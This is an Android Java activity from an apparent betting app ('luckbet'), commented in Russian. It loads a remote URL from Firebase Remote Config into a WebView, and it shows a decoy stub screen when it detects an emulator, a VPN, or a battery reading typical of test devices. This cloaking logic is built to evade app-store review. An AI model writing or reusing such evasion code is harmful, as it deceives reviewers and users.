package luck.luckbet.game;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;


import androidx.annotation.NonNull;
import android.app.Dialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.os.CountDownTimer;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

import java.util.Locale;

public class MainActivity2 extends AppCompatActivity {


    public boolean to;
    private static final String FILE_NAME="MY_FILE_NAME";
    private static final String URL_STRING="URL_STRING";
    public Bundle savedInst;
    String url_FB;
    String url_SP;
    SharedPreferences sPref;
    SharedPreferences.Editor ed;
    private FirebaseRemoteConfig mfirebaseRemoteConfig;


    Handler handler;
    Runnable runnable;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        savedInst = savedInstanceState;
        //проверка сохранена ли ссылка
        url_SP = getSharedPrefStr();
        if(url_SP=="") {
            //подключение к FireBase
            getFireBaseUrlConnection();
            getBool();

        }else{
            //проверка на подключение к интернету
            if(!hasConnection(this)){
                Intent intent = new Intent(MainActivity2.this, NoInternet.class);
                startActivity(intent);
            }
            else{//запускаем WebView
                browse(url_SP);
            }
        }
    }

    //включение WebView
    public void browse(String url){
        Intent intent = new Intent(MainActivity2.this, MainActivity3.class);
        intent.putExtra("url", url);
        startActivity(intent);
    }

    //проверка эмулятора
    private boolean checkIsEmu() {
        String phoneModel = Build.MODEL;
        String buildProduct = Build.PRODUCT;
        String buildHardware = Build.HARDWARE;
        String brand = Build.BRAND;
        return (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.toLowerCase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware.equals("goldfish")
                || brand.contains("google")
                || buildHardware.equals("vbox86")
                || buildProduct.equals("sdk")
                || buildProduct.equals("google_sdk")
                || buildProduct.equals("sdk_x86")
                || buildProduct.equals("vbox86p")
                || Build.BOARD.toLowerCase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.toLowerCase(Locale.getDefault()).contains("nox")
                || buildHardware.toLowerCase(Locale.getDefault()).contains("nox")
                || buildProduct.toLowerCase(Locale.getDefault()).contains("nox"))
                || (brand.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                ||"google_sdk".equals(Build.PRODUCT)
                || "sdk_gphone_x86_arm".equals(Build.PRODUCT)
                ||"sdk_google_phone_x86".equals(Build.PRODUCT);
    }

    public static boolean vpnActive(Context context){
        //this method doesn't work below API 21
        if (android.os.Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP)
            return false;
        boolean vpnInUse = false;
        ConnectivityManager connectivityManager = (ConnectivityManager)        context.getSystemService(Context.CONNECTIVITY_SERVICE);

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            Network activeNetwork = connectivityManager.getActiveNetwork();
            NetworkCapabilities caps = connectivityManager.getNetworkCapabilities(activeNetwork);
            return caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN);
        }
        Network[] networks = connectivityManager.getAllNetworks();
        for(int i = 0; i < networks.length; i++) {
            NetworkCapabilities caps = connectivityManager.getNetworkCapabilities(networks[i]);
            if(caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                vpnInUse = true;
                break;
            }
        }
        return vpnInUse;
    }

    private boolean isBatteryLevelInRange() {
        BatteryManager bm = (BatteryManager) this.getSystemService(BATTERY_SERVICE);
        int batLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        return (1<=batLevel)&&(batLevel<=99);
    }
    //проверка интернет подключения
    public static boolean hasConnection(final Context context)
    {
        ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        if (wifiInfo != null && wifiInfo.isConnected())
        {
            return true;
        }
        wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        if (wifiInfo != null && wifiInfo.isConnected())
        {
            return true;
        }
        wifiInfo = cm.getActiveNetworkInfo();
        if (wifiInfo != null && wifiInfo.isConnected())
        {
            return true;
        }
        return false;
    }

    private void getBool(){
        mfirebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                    @Override
                    public void onComplete(@NonNull Task<Boolean> task) {
                        if (task.isSuccessful()) {
                            Log.i("To", String.valueOf(task.getResult()));
                            String value = mfirebaseRemoteConfig.getString("to");
                            if(value.equals("true")){
                                if(vpnActive(MainActivity2.this)){
                                    plug();
                                }
                                else{
                                    getURLStr();
                                }
                            } else if(value.equals("false")) {
                                getURLStr();
                            } else if(value.equals("")) {
                                to= false;
                                getURLStr();
                            }

                        } else {
                            Log.i("To", "null");
                        }
                    }
                });
    }

    //получение ссылки и обработка вызова заглушки/WebView
    public void getURLStr(){
        try {
            mfirebaseRemoteConfig.fetchAndActivate()
                    .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                        @Override
                        public void onComplete(@NonNull Task<Boolean> task) {
                            if (task.isSuccessful()) {
                                Log.i("Fire", String.valueOf(task.getResult()));
                                url_FB = mfirebaseRemoteConfig.getString("url");
                                if (url_FB.isEmpty()||checkIsEmu()||(!isBatteryLevelInRange())) {
                                    plug();
                                } else {
                                    Log.i("Fire", url_FB);
                                    saveToSP();
                                    browse(url_FB);
                                }

                            } else {
                                url_FB = "";
                                plug();
                                Log.i("Fire", "null2");
                            }
                        }
                    });
        }
        catch (Exception e){
            System.out.println(e.getMessage());
            Intent intent = new Intent(MainActivity2.this, NoInternet.class);
            startActivity(intent);
        }
    }

    //получение локальной ссылки
    public String getSharedPrefStr(){
        sPref = getSharedPreferences(FILE_NAME,MODE_PRIVATE);
        String url_SP = sPref.getString(URL_STRING,"");
        return url_SP;
    }

    //подключение к Firebase
    public void getFireBaseUrlConnection(){
        //подключение к FireBase
        mfirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(10)
                .build();
        mfirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
        mfirebaseRemoteConfig.setDefaultsAsync(R.xml.url_values);
    }
    //вызыв зваглушки
    public void plug(){
        setContentView(R.layout.activity_main2);
    }
    //сохранение ссылки локально
    public void saveToSP(){
        ed = sPref.edit();
        ed.putString(URL_STRING, url_FB);
        ed.apply();
        browse(url_FB);
    }

    public void showInfo(View view) {
        Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.rules);
        dialog.setCancelable(false);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.show();
        Button btn_okey= (Button) dialog.findViewById(R.id.okey_btn);

        btn_okey.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                dialog.dismiss();
            }
        });
    }
}